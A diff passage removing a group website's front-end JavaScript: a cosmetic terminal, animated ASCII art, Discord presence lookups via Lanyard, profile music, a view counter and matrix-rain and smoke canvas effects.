-  termInput.value = '';
-  termRun(raw);
-  termScroll();
-});
-
-termInput.addEventListener('keydown', e => {
-  if(e.key === 'ArrowUp'){
-    if(!TERM_HISTORY.length) return;
-    e.preventDefault();
-    termHistIndex = Math.max(0, termHistIndex - 1);
-    termInput.value = TERM_HISTORY[termHistIndex] || '';
-  }else if(e.key === 'ArrowDown'){
-    if(!TERM_HISTORY.length) return;
-    e.preventDefault();
-    termHistIndex = Math.min(TERM_HISTORY.length, termHistIndex + 1);
-    termInput.value = TERM_HISTORY[termHistIndex] || '';
-  }
-});
-
-document.getElementById('termBody').addEventListener('click', e => {
-  if(e.target.closest('a, button')) return;
-  if(String(getSelection())) return;
-  termInput.focus({ preventScroll: true });
-});
-
-(function termInitial(){
-  const box = termBox();
-  termPrompt(box).textContent = 'neofetch';
-  box.appendChild(termFetch());
-  termPrompt(box).textContent = 'cat status.txt';
-  const row = document.createElement('div');
-  row.className = 'text-blood-soft';
-  const mark = document.createElement('span');
-  mark.className = 'text-blood-dim';
-  mark.textContent = '> ';
-  const text = document.createElement('span');
-  text.textContent = TERM.status;
-  row.append(mark, text);
-  box.appendChild(row);
-})();
-
-const enterArt = document.getElementById('enterArt');
-const bannerEl = document.getElementById('banner');
-const trimArt = text => text.replace(/\r/g, '').split('\n').map(line => line.replace(/\s+$/, '')).join('\n');
-const artSource = () => trimArt(innerWidth < 760 ? CONFIG.loadingAscii : CONFIG.asciiArt);
-
-function fitArt(el, text, maxFont, widthRatio, heightRatio){
-  const lines = text.split('\n');
-  const cols = Math.max(...lines.map(line => line.length), 1);
-  const size = Math.min(maxFont, (innerWidth * widthRatio) / (cols * .62), (innerHeight * heightRatio) / lines.length);
-  el.style.fontSize = Math.max(1.5, size).toFixed(2) + 'px';
-}
-
-const ART_GLYPHS = '.:-=+*#%@';
-const ART_ORDER = {
-  byRow: (row, col, rows) => row / rows,
-  print: (row, col, rows, cols) => (row / rows) * .8 + (col / cols) * .2,
-  bottomUpDiagonal: (row, col, rows, cols) => (col / cols) * .8 + .2 * (1 - row / rows),
-  fromCentre: (row, col, rows, cols) => {
-    const x = (col - cols / 2) / (cols / 2);
-    const y = (row - rows / 2) / (rows / 2);
-    return Math.min(1, Math.sqrt(x * x * .5 + y * y * .5) / .9);
-  },
-};
-const artEngines = new WeakMap();
-
-function createArtEngine(el, text, opts){
-  const cfg = {
-    glyphs: ART_GLYPHS,
-    sweep: 1.1,
-    jitter: .45,
-    order: ART_ORDER.byRow,
-    glitchMin: 2000,
-    glitchVar: 0,
-    glitchRows: 4,
-    glitchTime: 140,
-    glitchDelay: 1100,
-    corrupt: .12,
-    scanDuration: 2600,
-    scanPeriod: 6000,
-    scanPeriodVar: 3000,
-    scanWidth: 2,
-    scanUp: false,
-    scan: true,
-    scanDelay: 1200,
-    throttle: 28,
-    ...opts,
-  };
-  text = text.replace(/\r/g, '');
-  const lines = text.split('\n');
-  const rows = lines.length;
-  const cols = Math.max(1, ...lines.map(line => line.length));
-  const grid = lines.map(line => Array.from(line));
-  const times = grid.map((chars, r) => chars.map((ch, c) =>
-    (ch === ' ' || ch === '\u2800') ? -1 : cfg.order(r, c, rows, cols) * cfg.sweep + Math.random() * cfg.jitter
-  ));
-  const rowMax = times.map(row => row.reduce((a, t) => (t > a ? t : a), 0));
-  const doneRows = new Array(rows).fill(false);
-  const hotRows = new Array(rows).fill(false);
-  const lineText = new Array(rows).fill('');
-  const rand = () => cfg.glyphs[(Math.random() * cfg.glyphs.length) | 0];
-
-  el.innerHTML = '';
-  const lineEls = grid.map(chars => {
-    const div = document.createElement('div');
-    div.textContent = ' '.repeat(chars.length);
-    el.appendChild(div);
-    return div;
-  });
-
-  let raf = 0, startedAt = 0, lastFrame = 0, started = false, revealDone = false;
-  let glitchUntil = 0, glitching = false, glitchRowList = [];
-  let nextGlitch = 0, scanActive = false, scanStartedAt = 0, nextScan = 0;
-
-  function setLine(r, value){
-    if(lineText[r] === value) return;
-    lineText[r] = value;
-    lineEls[r].textContent = value;
-  }
-  function corruptLine(value){
-    let out = '';
-    for(let i = 0; i < value.length; i++){
-      const ch = value.charAt(i);
-      out += (ch === ' ' || Math.random() > cfg.corrupt) ? ch : rand();
-    }
-    return out;
-  }
-  function restoreRow(r){
-    lineEls[r].style.transform = '';
-    setLine(r, grid[r].join(''));
-  }
-  function clearHot(){
-    for(let r = 0; r < rows; r++){
-      if(!hotRows[r]) continue;
-      hotRows[r] = false;
-      lineEls[r].classList.remove('hot');
-    }
-  }
-  function revealAll(){
-    for(let r = 0; r < rows; r++){
-      doneRows[r] = true;
-      if(glitching && glitchRowList.indexOf(r) >= 0) lineEls[r].style.transform = '';
-      setLine(r, grid[r].join(''));
-      lineEls[r].classList.remove('hot');
-      hotRows[r] = false;
-    }
-    glitching = false;
-    glitchRowList = [];
-    revealDone = true;
-    nextGlitch = performance.now() + cfg.glitchDelay;
-  }
-  function revealStep(now){
-    const t = (now - startedAt) / 1000;
-    let all = true;
-    for(let r = 0; r < rows; r++){
-      if(doneRows[r]) continue;
-      if(t > rowMax[r] + .35){
-        setLine(r, grid[r].join(''));
-        doneRows[r] = true;
-        continue;
-      }
-      all = false;
-      const chars = grid[r], charTimes = times[r];
-      let out = '';
-      for(let c = 0; c < chars.length; c++){
-        const at = charTimes[c];
-        if(at < 0) out += chars[c];
-        else if(t < at) out += ' ';
-        else if(t < at + .3) out += rand();
-        else out += chars[c];
-      }
-      setLine(r, out);
-    }
-    if(all) revealAll();
-  }
-  function glitchStep(now){
-    if(now > nextGlitch){
-      glitchUntil = now + cfg.glitchTime;
-      nextGlitch = now + cfg.glitchMin + Math.random() * cfg.glitchVar;
-      glitchRowList = [];
-      const used = {};
-      const count = Math.min(cfg.glitchRows, rows);
-      while(glitchRowList.length < count){
-        const r = (Math.random() * rows) | 0;
-        if(used[r]) continue;
-        used[r] = 1;
-        glitchRowList.push(r);
-      }
-    }
-    if(now < glitchUntil){
-      glitching = true;
-      for(const r of glitchRowList){
-        lineEls[r].style.transform = 'translateX(' + ((Math.random() * 1.6) - .8).toFixed(2) + 'em)';
-        setLine(r, corruptLine(grid[r].join('')));
-      }
-    }else if(glitching){
-      glitching = false;
-      for(const r of glitchRowList) restoreRow(r);
-    }
-  }
-  function scanStep(now){
-    if(!cfg.scan) return;
-    if(!scanActive){
-      if(now > nextScan){
-        scanActive = true;
-        scanStartedAt = now;
-      }
-      return;
-    }
-    const p = (now - scanStartedAt) / cfg.scanDuration;
-    if(p > 1){
-      scanActive = false;
-      nextScan = now + cfg.scanPeriod + Math.random() * cfg.scanPeriodVar;
-      clearHot();
-      return;
-    }
-    const cur = (cfg.scanUp ? 1 - p : p) * (rows + 2 * cfg.scanWidth) - cfg.scanWidth;
-    for(let r = 0; r < rows; r++){
-      const on = Math.abs(r - cur) <= cfg.scanWidth;
-      if(on === hotRows[r]) continue;
-      hotRows[r] = on;
-      lineEls[r].classList.toggle('hot', on);
-    }
-  }
-  function loop(now){
-    raf = requestAnimationFrame(loop);
-    if(!started) return;
-    if(now - lastFrame < cfg.throttle) return;
-    lastFrame = now;
-    if(!revealDone){
-      revealStep(now);
-      return;
-    }
-    glitchStep(now);
-    scanStep(now);
-  }
-  function start(now){
-    startedAt = now == null ? performance.now() : now;
-    lastFrame = 0;
-    started = true;
-    revealDone = false;
-    glitching = false;
-    glitchRowList = [];
-    glitchUntil = 0;
-    doneRows.fill(false);
-    hotRows.fill(false);
-    for(let r = 0; r < rows; r++){
-      lineText[r] = '';
-      lineEls[r].textContent = ' '.repeat(grid[r].length);
-      lineEls[r].style.transform = '';
-      lineEls[r].classList.remove('hot');
-    }
-    nextScan = startedAt + 1000 * (cfg.sweep + cfg.jitter) + cfg.scanDelay;
-    nextGlitch = startedAt + 1000 * (cfg.sweep + cfg.jitter) + 2500;
-    if(!raf) raf = requestAnimationFrame(loop);
-  }
-  function destroy(){
-    if(raf) cancelAnimationFrame(raf);
-    raf = 0;
-    started = false;
-    el.innerHTML = '';
-  }
-
-  return {
-    text,
-    start,
-    destroy,
-    revealAll,
-    get started(){ return started; },
-    get done(){ return revealDone; },
-    get startedAt(){ return startedAt; },
-    get lineCount(){ return rows; },
-    get hotCount(){ return hotRows.filter(Boolean).length; },
-    get glitchRows(){ return glitchRowList.slice(); },
-    get glitching(){ return glitching; },
-    get cols(){ return cols; },
-  };
-}
-
-function setArt(el, text, opts){
-  const prev = artEngines.get(el);
-  if(prev && prev.text === text) return prev;
-  const wasStarted = prev && prev.started;
-  if(prev) prev.destroy();
-  if(reduceMotion){
-    el.textContent = text;
-    const stub = { text, start(){}, destroy(){ el.textContent = ''; }, started: true, done: true };
-    artEngines.set(el, stub);
-    return stub;
-  }
-  const engine = createArtEngine(el, text, opts);
-  artEngines.set(el, engine);
-  if(wasStarted) engine.start();
-  return engine;
-}
-function startArtEngine(el){
-  const engine = artEngines.get(el);
-  if(engine && typeof engine.start === 'function') engine.start();
-}
-
-function layoutArt(){
-  const text = artSource();
-  fitArt(enterArt, text, 40, .88, .62);
-  fitArt(bannerEl, text, 18, .9, .42);
-  setArt(enterArt, text, {
-    order: ART_ORDER.print, sweep: 1.35, jitter: .1,
-    glitchMin: 4000, glitchVar: 2400, glitchRows: 2, glitchTime: 120,
-    scan: false,
-  });
-  setArt(bannerEl, text, {
-    order: ART_ORDER.bottomUpDiagonal, sweep: 1.05, jitter: .4,
-    glitchMin: 2000, glitchVar: 0, glitchRows: 3, glitchDelay: 700,
-    scanPeriod: 9000, scanPeriodVar: 3500, scanWidth: 2,
-  });
-}
-layoutArt();
-addEventListener('resize', layoutArt);
-
-let bgArtStarted = false;
-function startBackgroundArt(){
-  if(bgArtStarted || reduceMotion) return;
-  bgArtStarted = true;
-  const arts = [...document.querySelectorAll('.bgart')].slice(0, 4);
-  arts.forEach((el, i) => {
-    const engine = createArtEngine(el, CONFIG.bgAscii, {
-      order: i % 2 ? ART_ORDER.bottomUpDiagonal : ART_ORDER.fromCentre,
-      sweep: 1.8 + Math.random() * .7, jitter: .8,
-      glitchMin: 4200 + Math.random() * 2600, glitchVar: 4800, glitchRows: 2,
-      scanDuration: 3000, scanPeriod: 9000 + Math.random() * 5000, scanWidth: 2,
-      scan: false,
-      throttle: 50,
-    });
-    engine.start();
-  });
-}
-
-const S = {};
-let hoverId = null;
-const statusLabels = { online:'online', idle:'idle', dnd:'do not disturb', offline:'offline' };
-const activityLabels = ['playing ', 'streaming ', 'listening to ', 'watching ', '', 'competing in '];
-
-function describeActivity(data, status){
-  if(!data) return statusLabels[status] || status;
-  const custom = (data.activities || []).find(a => a.type === 4);
-  if(custom && custom.state) return custom.state;
-  const spotify = a => /spotify/i.test(a.name || '') || /^spotify:/i.test(a.id || '');
-  const act = (data.activities || []).find(a => a.type !== 4 && !spotify(a));
-  if(act) return (activityLabels[act.type] || '') + act.name;
-  return statusLabels[status] || status;
-}
-
-const ST = ['online', 'idle', 'dnd', 'offline'];
-function setSt(el, st){ ST.forEach(s => el.classList.toggle(s, s === st)); }
-function setDeco(box, ds){
-  let d = box.querySelector('.d');
-  if(ds){
-    if(!d){
-      d = document.createElement('img');
-      d.className = 'd';
-      d.alt = '';
-      box.insertBefore(d, box.querySelector('.s'));
-    }
-    if(d.getAttribute('src') !== ds) d.src = ds;
-  }else if(d) d.remove();
-}
-
-function render(id){
-  const p = S[id], u = p && p.discord_user, st = p ? (p.discord_status || 'offline') : 'offline';
-  const av = avatarUrl(u, id), ds = decoUrl(u), nm = u ? (u.display_name || u.global_name || u.username) : '';
-  document.querySelectorAll('.m[data-id="' + id + '"]').forEach(el => {
-    const box = el.querySelector('.av'), a = box.querySelector('.a');
-    setSt(box, st);
-    if(a.getAttribute('src') !== av) a.src = av;
-    setDeco(box, ds);
-    if(nm) el.querySelector('.nm').textContent = nm.toLowerCase();
-  });
-  if(hoverId === id && BYID[id]) fillHover(BYID[id]);
-  if(openMember && openMember.discordId === id) fillProfile(openMember);
-}
-
-function startPresence(){
-  Promise.all(ALL.map(id =>
-    fetch('https://api.lanyard.rest/v1/users/' + id)
-      .then(r => r.json())
-      .then(j => { if(j.success){ S[id] = j.data; render(id); } })
-      .catch(() => {})
-  )).then(socket);
-
-  function socket(){
-    let w, hb;
-    try{ w = new WebSocket('wss://api.lanyard.rest/socket'); }catch(e){ return; }
-    w.onmessage = m => {
-      const j = JSON.parse(m.data);
-      if(j.op === 1){
-        w.send(JSON.stringify({ op: 2, d: { subscribe_to_ids: ALL } }));
-        hb = setInterval(() => { if(w.readyState === 1) w.send('{"op":3}'); }, j.d.heartbeat_interval);
-      }else if(j.op === 0 && j.t === 'INIT_STATE'){
-        for(const key in j.d) if(j.d[key] && j.d[key].discord_user){ S[key] = j.d[key]; render(key); }
-      }else if(j.op === 0 && j.t === 'PRESENCE_UPDATE' && j.d && j.d.discord_user){
-        S[j.d.discord_user.id] = j.d;
-        render(j.d.discord_user.id);
-      }
-    };
-    w.onclose = () => { clearInterval(hb); setTimeout(socket, 5000); };
-  }
-}
-
-const hoverCard = document.getElementById('hoverCard');
-const hoverCardBanner = document.getElementById('hoverCardBanner');
-let hoverBtn = null;
-
-function fillHover(member){
-  const id = member.discordId, p = S[id], u = p && p.discord_user, st = p ? (p.discord_status || 'offline') : 'offline';
-  const av = avatarUrl(u, id);
-  const avEl = document.getElementById('hoverCardAvatar');
-  if(avEl.getAttribute('src') !== av) avEl.src = av;
-  const box = document.getElementById('hoverCardAvatarWrap');
-  setSt(box, st);
-  setDeco(box, decoUrl(u));
-  document.getElementById('hoverCardName').textContent = u ? (u.display_name || u.global_name || u.username) : member.name;
-  document.getElementById('hoverCardHandle').textContent = u ? '@' + u.username : '@' + member.name;
-  const sEl = document.getElementById('hoverCardStatus');
-  setSt(sEl, st);
-  sEl.querySelector('span').textContent = statusLabels[st] || st;
-  const actText = p ? describeActivity(p, st) : (statusLabels[st] || st);
-  document.getElementById('hoverCardAct').textContent = actText === (statusLabels[st] || st) ? '\u2014' : actText;
-
-  hoverCardBanner.style.backgroundImage = '';
-  hoverCardBanner.style.backgroundColor = '';
-  const ok = applyBackground(hoverCardBanner, profileBanner(member));
-  if(!ok && !hoverCardBanner.style.backgroundImage){
-    hoverCardBanner.style.background = 'linear-gradient(135deg,#2a0a10,#0a0405)';
-  }
-}
-
-function positionHover(btn){
-  const r = btn.getBoundingClientRect();
-  const cw = hoverCard.offsetWidth || 216;
-  const ch = hoverCard.offsetHeight || 160;
-  let x = r.left + r.width / 2 - cw / 2;
-  let y = r.bottom + 12;
-  if(y + ch > innerHeight - 12) y = r.top - ch - 12;
-  if(y < 12) y = 12;
-  x = Math.max(12, Math.min(innerWidth - cw - 12, x));
-  hoverCard.style.left = Math.round(x) + 'px';
-  hoverCard.style.top = Math.round(y) + 'px';
-}
-
-function showHover(btn){
-  const member = BYID[btn.dataset.id];
-  if(!member) return;
-  hoverBtn = btn;
-  hoverId = member.discordId;
-  fillHover(member);
-  hoverCard.classList.add('on');
-  hoverCard.setAttribute('aria-hidden', 'false');
-  positionHover(btn);
-}
-function hideHover(keepAudio){
-  hoverBtn = null;
-  hoverId = null;
-  hoverCard.classList.remove('on');
-  hoverCard.setAttribute('aria-hidden', 'true');
-  stopHoverSound(!!keepAudio);
-}
-
-// Hover preview: pointing at a member plays their profile music (same track as their profile),
-// ducking the site music; leaving a card stops it and brings the site music back.
-const hoverMusic = new Audio();
-hoverMusic.loop = true;
-hoverMusic.preload = 'none';
-hoverMusic.volume = .5;
-let hoverSoundOn = false, hoverSoundTimer = 0, hoverReleaseTimer = 0;
-
-function startHoverSound(member){
-  clearTimeout(hoverSoundTimer);
-  clearTimeout(hoverReleaseTimer);
-  if(!member || !member.music || !entered) return;
-  hoverSoundTimer = setTimeout(() => {
-    if(profileModal.classList.contains('visible')) return;
-    duckSiteAudio();
-    if(hoverMusic.dataset.src !== member.music){
-      hoverMusic.dataset.src = member.music;
-      hoverMusic.src = member.music;
-    }
-    hoverSoundOn = true;
-    hoverMusic.play().catch(() => {});
-  }, 160);
-}
-function stopHoverSound(keepDuck){
-  clearTimeout(hoverSoundTimer);
-  if(!hoverSoundOn) return;
-  hoverSoundOn = false;
-  hoverMusic.pause();
-  if(keepDuck) return;
-  clearTimeout(hoverReleaseTimer);
-  hoverReleaseTimer = setTimeout(() => {
-    if(!hoverSoundOn && !profileModal.classList.contains('visible')) unduckSiteAudio();
-  }, 300);
-}
-
-rosterEl.addEventListener('pointerover', e => {
-  if(e.pointerType === 'touch') return;
-  const btn = e.target.closest('.m');
-  if(!btn || btn.classList.contains('m-empty') || btn === hoverBtn) return;
-  showHover(btn);
-  startHoverSound(BYID[btn.dataset.id]);
-});
-rosterEl.addEventListener('pointerout', e => {
-  const btn = e.target.closest('.m');
-  if(!btn || btn !== hoverBtn) return;
-  if(btn.contains(e.relatedTarget)) return;
-  hideHover();
-});
-rosterEl.addEventListener('focusin', e => {
-  const btn = e.target.closest('.m');
-  if(btn && !btn.classList.contains('m-empty')) showHover(btn);
-});
-rosterEl.addEventListener('focusout', e => {
-  if(e.target.closest('.m')) hideHover();
-});
-document.getElementById('shell').addEventListener('scroll', () => {
-  if(hoverId) hideHover();
-}, { passive: true });
-addEventListener('resize', () => {
-  if(hoverId) hideHover();
-});
-
-let audioStarted = false;
-function startAmbientAudio(){
-  if(audioStarted) return;
-  audioStarted = true;
-  const el = document.getElementById('bgMusicEl');
-  el.src = CONFIG.music.url;
-  el.volume = CONFIG.music.volume;
-  el.play().catch(e => console.warn('background music blocked/unavailable', e));
-}
-function duckSiteAudio(){
-  const bg = document.getElementById('bgMusicEl');
-  if(bg && !bg.paused){ bg.dataset.wasPlaying = '1'; bg.pause(); }
-}
-function unduckSiteAudio(){
-  const bg = document.getElementById('bgMusicEl');
-  if(bg && bg.dataset.wasPlaying === '1'){ bg.play().catch(() => {}); delete bg.dataset.wasPlaying; }
-}
-
-const profileModal = document.getElementById('profileModal');
-const profileBody = document.getElementById('profileModalBody');
-const viewsCountEl = document.getElementById('profileModalViewsCount');
-document.getElementById('profileModalArt').textContent = FETCH_ART;
-let openMember = null;
-let cmdTimer = 0;
-let runTimer = 0;
-
-const VIEW_API = 'https://abacus.jasoncameron.dev';
-const VIEW_COUNTER_NAMESPACE = 'threat2society-site';
-const VIEW_CACHE_KEY = 't2sProfileViewsCache';
-const VIEW_SEEN_KEY = 't2sProfileViewsSeen';
-
-function readStore(key){
-  try{ return JSON.parse(localStorage.getItem(key) || '{}') || {}; }catch(e){ return {}; }
-}
-function writeStore(key, obj){
-  try{ localStorage.setItem(key, JSON.stringify(obj)); }catch(e){}
-}
-async function viewCounter(op, slug){
-  const res = await fetch(VIEW_API + '/' + op + '/' + VIEW_COUNTER_NAMESPACE + '/profile-' + encodeURIComponent(slug), { cache: 'no-store' });
-  if(res.status === 404 && op === 'get') return 0;
-  if(!res.ok) throw new Error('view counter responded ' + res.status);
-  const n = Number((await res.json()).value);
-  if(!isFinite(n)) throw new Error('view counter returned no value');
-  return n;
-}
-// One view per browser per profile: the first open adds 1 to the shared total, later opens only read it.
-async function bumpProfileViewCount(slug){
-  const seen = readStore(VIEW_SEEN_KEY);
-  const first = !seen[slug];
-  try{
-    const n = await viewCounter(first ? 'hit' : 'get', slug);
-    if(first){ seen[slug] = 1; writeStore(VIEW_SEEN_KEY, seen); }
-    const cache = readStore(VIEW_CACHE_KEY);
-    cache[slug] = n;
-    writeStore(VIEW_CACHE_KEY, cache);
-    return n;
-  }catch(err){
-    const cached = readStore(VIEW_CACHE_KEY)[slug];
-    return typeof cached === 'number' ? cached : null;
-  }
-}
-
-function fillProfile(member){
-  const id = member.discordId, p = S[id], u = p && p.discord_user, st = p ? (p.discord_status || 'offline') : 'offline';
-  const box = document.getElementById('profileModalAvatarWrap');
-  const a = document.getElementById('profileModalAvatar');
-  const av = avatarUrl(u, id);
-  setSt(box, st);
-  if(a.getAttribute('src') !== av) a.src = av;
-  setDeco(box, decoUrl(u));
-  document.getElementById('profileModalName').textContent = u ? (u.display_name || u.global_name || u.username) : member.name;
-  document.getElementById('profileModalHandle').textContent = u ? '@' + u.username : '@' + member.name;
-  const sEl = document.getElementById('profileModalStatus');
-  setSt(sEl, st);
-  sEl.querySelector('span').textContent = statusLabels[st] || st;
-  const act = p ? describeActivity(p, st) : (statusLabels[st] || st);
-  document.getElementById('profileModalStatusText').textContent = act === (statusLabels[st] || st) ? '\u2014' : act;
-}
-
-function setRunLine(text, done){
-  const run = document.getElementById('profileModalRun');
-  document.getElementById('profileModalRunText').textContent = text;
-  if(run.hidden){ run.hidden = false; requestAnimationFrame(() => run.classList.add('on')); }
-  run.classList.toggle('done', !!done);
-}
-
-function typeProfileCommand(member){
-  const cmdEl = document.getElementById('profileModalCmd');
-  const run = document.getElementById('profileModalRun');
-  const text = 'get-profile --name "' + member.name + '"';
-  clearTimeout(cmdTimer);
-  clearTimeout(runTimer);
-  profileModal.classList.add('typing');
-  run.hidden = true;
-  run.classList.remove('on', 'done');
-  cmdEl.textContent = '';
-  if(reduceMotion){
-    cmdEl.textContent = text;
-    setRunLine('[ ok ] profile loaded', true);
-    profileModal.classList.remove('typing');
-    return;
-  }
-  let i = 0;
-  (function step(){
-    cmdEl.textContent += text.charAt(i++);
-    if(i < text.length){
-      const pause = Math.random() < .07 ? 150 + Math.random() * 160 : 0;
-      cmdTimer = setTimeout(step, 58 + Math.random() * 44 + pause);
-    }else{
-      cmdTimer = setTimeout(() => {
-        setRunLine('executing ' + text, false);
-        runTimer = setTimeout(() => {
-          setRunLine('[ ok ] profile loaded', true);
-          runTimer = setTimeout(() => profileModal.classList.remove('typing'), 300);
-        }, 720);
-      }, 240);
-    }
-  })();
-}
-
-function openProfile(member){
-  if(!member) return;
-  hideHover(true);
-  const slug = slugify(member.name);
-  const handle = 't2s@' + String(member.name).toLowerCase();
-  openMember = member;
-  fillProfile(member);
-
-  profileModal.querySelectorAll('.pm-user').forEach(el => { el.textContent = handle; });
-  document.getElementById('profileModalPath').textContent = handle + ': ~/profiles/' + slug;
-  profileModal.classList.add('typing');
-  document.getElementById('profileModalCmd').textContent = '';
-
-  const bg = backgroundValue(profileBanner(member));
-  profileModal.style.setProperty('--pm-bg', bg.image || 'none');
-
-  profileModal.classList.add('visible');
-  profileModal.setAttribute('aria-hidden', 'false');
-  profileBody.scrollTop = 0;
-  typeProfileCommand(member);
-
-  try{ history.pushState({ profile: slug }, '', '/' + slug); }catch(err){}
-
-  const pm = document.getElementById('profileMusicEl');
-  const musicVal = member.music || '';
-  if(musicVal){
-    duckSiteAudio();
-    pm.src = musicVal;
-    pm.volume = .5;
-    pm.play().catch(() => {});
-  }else{
-    pm.pause();
-    pm.removeAttribute('src');
-    if(audioStarted) unduckSiteAudio();
-    else startAmbientAudio();
-  }
-
-  viewsCountEl.textContent = '\u00b7\u00b7\u00b7';
-  bumpProfileViewCount(slug).then(count => {
-    if(openMember !== member) return;
-    viewsCountEl.textContent = typeof count === 'number' ? count.toLocaleString() : '\u2014';
-  });
-}
-
-function closeProfile(){
-  if(!profileModal.classList.contains('visible')) return;
-  clearTimeout(cmdTimer);
-  clearTimeout(runTimer);
-  const run = document.getElementById('profileModalRun');
-  run.hidden = true;
-  run.classList.remove('on', 'done');
-  profileModal.classList.remove('typing');
-  profileModal.classList.remove('visible');
-  profileModal.setAttribute('aria-hidden', 'true');
-
-  const pm = document.getElementById('profileMusicEl');
-  if(!pm.paused) pm.pause();
-  if(audioStarted) unduckSiteAudio();
-  else startAmbientAudio();
-
-  if(location.pathname !== '/'){
-    try{ history.pushState(null, '', '/'); }catch(err){}
-  }
-  openMember = null;
-}
-
-document.getElementById('profileModalClose').addEventListener('click', closeProfile);
-profileModal.addEventListener('click', e => { if(e.target === profileModal) closeProfile(); });
-document.addEventListener('keydown', e => { if(e.key === 'Escape') closeProfile(); });
-addEventListener('popstate', closeProfile);
-
-const matrixCanvas = document.getElementById('matrix');
-const mctx = matrixCanvas.getContext('2d');
-const smokeCanvas = document.getElementById('smoke');
-const sctx = smokeCanvas.getContext('2d');
-const RAIN_GLYPHS = '01<>/\\|+=*:.#%';
-const RAIN_COL = 22, RAIN_ROW = 14;
-let mCols = [], matrixOn = false, mLast = 0;
-let sParts = [], sRaf = 0, sLast = 0, sSprite = null;
-let fxStarted = false;
-
-const rainGlyph = () => RAIN_GLYPHS[(Math.random() * RAIN_GLYPHS.length) | 0];
-
-function sizeFxCanvas(cv, ctx){
-  const dpr = Math.min(2, window.devicePixelRatio || 1);
-  cv.width = Math.max(1, Math.round(innerWidth * dpr));
-  cv.height = Math.max(1, Math.round(innerHeight * dpr));
-  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-}
-function initMatrix(){
-  const count = Math.ceil(innerWidth / RAIN_COL) + 1;
-  mCols = Array.from({ length: count }, () => ({
-    y: Math.random() * innerHeight,
-    speed: 1 + Math.random() * 2.4,
-    chars: Array.from({ length: 6 + ((Math.random() * 9) | 0) }, rainGlyph),
-  }));
-}
-function drawMatrix(now){
-  if(!matrixOn) return;
-  requestAnimationFrame(drawMatrix);
-  if(now - mLast < 33) return;
-  mLast = now;
-  const w = innerWidth, h = innerHeight;
-  mctx.clearRect(0, 0, w, h);
-  mctx.font = '12px "Cascadia Code",Consolas,"Lucida Console",monospace';
-  mctx.textBaseline = 'top';
-  mctx.fillStyle = '#ff4d5c';
-  for(let i = 0; i < mCols.length; i++){
-    const col = mCols[i], x = RAIN_COL * i + 4, trail = col.chars.length;
-    const headRow = Math.floor(col.y / RAIN_ROW);
-    for(let t = 0; t < trail; t++){
-      mctx.globalAlpha = t ? .1 * (1 - t / trail) : .24;
-      const idx = Math.abs(131 * i + 37 * (headRow - t)) % RAIN_GLYPHS.length;
-      mctx.fillText(RAIN_GLYPHS.charAt(idx), x, col.y - RAIN_ROW * t);
-    }
-    col.y += col.speed;
-    if(col.y - RAIN_ROW * trail > h){
-      col.y = -200 * Math.random();
-      col.speed = 1 + Math.random() * 2.4;
-    }
-  }
-  mctx.globalAlpha = 1;
-}
-function startMatrix(){
-  sizeFxCanvas(matrixCanvas, mctx);
-  initMatrix();
-  if(reduceMotion) return;
-  matrixOn = true;
-  mLast = 0;
-  requestAnimationFrame(drawMatrix);
-}
-function makeSmokeSprite(){
-  const s = document.createElement('canvas');
-  s.width = s.height = 96;
-  const c = s.getContext('2d');
-  const g = c.createRadialGradient(48, 48, 0, 48, 48, 48);
-  g.addColorStop(0, 'rgba(255,130,145,1)');
-  g.addColorStop(.35, 'rgba(205,60,78,.55)');
-  g.addColorStop(1, 'rgba(120,20,30,0)');
-  c.fillStyle = g;
-  c.fillRect(0, 0, 96, 96);
-  return s;
-}
-function spawnSmoke(x, y, n){
-  for(let i = 0; i < n; i++){
-    sParts.push({
-      x: x + (Math.random() - .5) * 18,
-      y: y + (Math.random() - .5) * 18,
-      vx: (Math.random() - .5) * 16,
-      vy: -10 - Math.random() * 24,
-      r: 9 + Math.random() * 18,
-      grow: 16 + Math.random() * 28,
-      a: .12 + Math.random() * .13,
-      life: 0,
-      ttl: .8 + Math.random() * .8,
-    });
-  }
-  if(sParts.length > 90) sParts.splice(0, sParts.length - 90);
-  if(!sRaf){ sLast = performance.now(); sRaf = requestAnimationFrame(smokeFrame); }
-}
-function smokeFrame(now){
-  const dt = Math.min(.05, (now - sLast) / 1000 || .016);
-  sLast = now;
-  sctx.clearRect(0, 0, innerWidth, innerHeight);
-  sctx.globalCompositeOperation = 'lighter';
-  for(let i = sParts.length - 1; i >= 0; i--){
-    const p = sParts[i];
-    p.life += dt;
-    if(p.life >= p.ttl){ sParts.splice(i, 1); continue; }
-    p.x += p.vx * dt;
-    p.y += p.vy * dt;
-    p.vx *= .985;
-    p.vy -= 4 * dt;
-    const k = p.life / p.ttl;
-    const r = p.r + p.grow * k;
-    sctx.globalAlpha = Math.max(0, p.a * (1 - k));
-    sctx.drawImage(sSprite, p.x - r, p.y - r, r * 2, r * 2);
-  }
-  sctx.globalAlpha = 1;
-  if(sParts.length){
-    sRaf = requestAnimationFrame(smokeFrame);
-  }else{
-    sRaf = 0;
-    sctx.clearRect(0, 0, innerWidth, innerHeight);
-  }
-}
-function startFx(){
-  if(fxStarted) return;
-  fxStarted = true;
-  sizeFxCanvas(smokeCanvas, sctx);
-  sSprite = makeSmokeSprite();
-  startMatrix();
-
-  addEventListener('resize', () => {
-    sizeFxCanvas(smokeCanvas, sctx);
-    if(matrixOn){
-      sizeFxCanvas(matrixCanvas, mctx);
-      initMatrix();
-    }
-  });
-  addEventListener('pointerdown', e => {
-    if(reduceMotion || e.pointerType === 'touch' || !document.body.classList.contains('in')) return;
-    spawnSmoke(e.clientX, e.clientY, 7);
-  }, { passive: true });
-}
-
-let entered = false;
-let gateOpen = false;
-let building = false;
-const enterEl = document.getElementById('enter');
-const splashArt = document.getElementById('splashArt');
-const loadFill = document.getElementById('enterLoadFill');
-const loadPct = document.getElementById('enterLoadPct');
-const SPLASH_MS = 3000;
-const BUILD_MS = 1750;
-
-function revealSite(){
-  document.body.classList.add('in');
-  initScrollReveal();
-  startFx();
-  startArtEngine(bannerEl);
-  startBackgroundArt();
-  enterEl.classList.add('gone');
-  setTimeout(() => { enterEl.style.display = 'none'; }, 1200);
-  if(deepLinkedProfile) setTimeout(() => openProfile(deepLinkedProfile), 1100);
-}
-
-function enterSite(){
-  if(entered) return;
-  entered = true;
-  if(!deepLinkedProfile) startAmbientAudio();
-  revealSite();
-}
-
-function showArt(){
-  enterEl.classList.add('art');
-  setTimeout(() => {
-    startArtEngine(enterArt);
-    startLoadMeter();
-  }, 280);
-}
-
-function startLoadMeter(){
-  if(reduceMotion || !loadFill || !loadPct) return;
-  loadFill.style.transform = 'scaleX(0)';
